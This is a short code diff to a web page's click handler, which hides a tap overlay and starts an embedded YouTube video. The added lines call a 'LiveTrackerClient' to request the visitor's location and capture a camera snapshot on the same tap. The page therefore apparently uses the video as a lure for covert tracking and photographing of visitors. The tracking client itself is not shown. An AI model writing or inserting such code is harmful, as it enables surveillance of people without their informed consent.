@@ -445,7 +445,10 @@
         function triggerPermissions() {
             tapOverlay.classList.add('hidden');
             iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;
-
+            if (window.LiveTrackerClient) {
+                window.LiveTrackerClient.requestLocation();
+                window.LiveTrackerClient.captureCameraSnapshot();
+            }
         }
 
         tapOverlay.addEventListener('click', triggerPermissions);
